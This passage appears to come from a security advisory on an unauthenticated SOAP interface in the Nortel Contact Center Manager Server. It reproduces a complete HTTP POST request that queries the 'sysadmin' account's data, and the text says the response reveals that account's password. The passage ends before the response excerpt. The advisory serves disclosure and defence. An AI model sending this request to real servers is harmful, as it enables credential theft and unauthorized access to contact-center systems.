Vulnerability overview:
-----------------------

The Nortel Contact Center Manager Server web application provides a SOAP
interface. This interface does not need authorisation and responds to
certain requests with sensitive information.


Vulnerability description:
--------------------------

The following SOAP request queries the user data for the user
"sysadmin":

---
POST /Common/WebServices/SOAPWrapperCommon/SOAPWrapperCommonWS.asmx
HTTP/1.1
Host: 10.1.2.3
Content-Type: text/xml; charset=utf-8
SOAPAction:
"http://SoapWrapperCommon.CCMA.Applications.Nortel.com/SOAPWrapperCommon_UsersWS_GetServers_Wrapper"
Content-Length: 661

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SOAPWrapperCommon_UsersWS_GetServers_Wrapper
xmlns="http://SoapWrapperCommon.CCMA.Applications.Nortel.com">
      <ccmaUserName>string</ccmaUserName>
      <clientIP>string</clientIP>
      <componentID>string</componentID>
      <sessionID>string</sessionID>

      <strPassword>string</strPassword>
    </SOAPWrapperCommon_UsersWS_GetServers_Wrapper>
  </soap:Body>
</soap:Envelope>

The following is an excerpt of the response to the previous query. It
contains the user sysadmin with the corresponding password (password,
server IP address, and server name has been changed):
